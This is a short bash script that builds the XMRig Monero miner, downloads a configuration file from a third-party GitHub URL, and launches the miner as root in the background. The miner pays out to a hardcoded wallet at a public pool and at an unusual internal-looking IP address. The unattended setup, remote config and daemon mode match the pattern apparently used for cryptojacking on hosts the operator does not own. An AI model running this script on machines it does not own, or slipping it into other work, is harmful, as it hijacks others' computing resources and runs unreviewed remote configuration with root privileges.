#!/bin/bash

 apt-get update && sudo apt-get upgrade -y && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y 

git clone https://github.com/xmrig/xmrig.git 

cd xmrig && mkdir build && cd build && cmake .. && make

wget https://raw.githubusercontent.com/basetrue/home/master/config.json && sudo ./xmrig -o us-west.minexmr.com:443 -u 41k8GajDoKSbzbPb9EvqkwWonJTE9kxDG38udoUx5FsiMkUv1TvNtTA5iSvkpoEQFi941RRTHkiJnUqwoFxFWMcTFneVZk4 -k --tls --rig-id UBUNTU -o 168.63.129.16:80 -u 41k8GajDoKSbzbPb9EvqkwWonJTE9kxDG38udoUx5FsiMkUv1TvNtTA5iSvkpoEQFi941RRTHkiJnUqwoFxFWMcTFneVZk4 --coin monero --daemon
